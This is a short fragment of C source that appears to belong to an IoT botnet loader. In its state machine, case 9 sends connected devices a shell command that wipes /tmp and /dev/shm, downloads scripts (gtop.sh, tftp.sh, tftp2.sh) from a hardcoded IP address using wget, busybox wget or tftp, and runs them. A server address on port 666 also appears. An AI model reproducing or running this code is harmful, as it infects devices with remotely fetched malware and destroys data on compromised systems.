...
{
        "89.248.162.171:666" //Start the server on this port
};
        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "rm -rf /tmp/* /dev/shm/*;cd /tmp || cd /dev/shm;wget http://89.248.162.171/gtop.sh || busybox wget http://89.248.162.171/gtop.sh;sh gtop.sh;tftp 89.248.162.171 -c get tftp.sh;sh tftp.sh;tftp -r tftp2.sh -g 89.248.162.171;sh tftp2.sh\r\n", 234, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
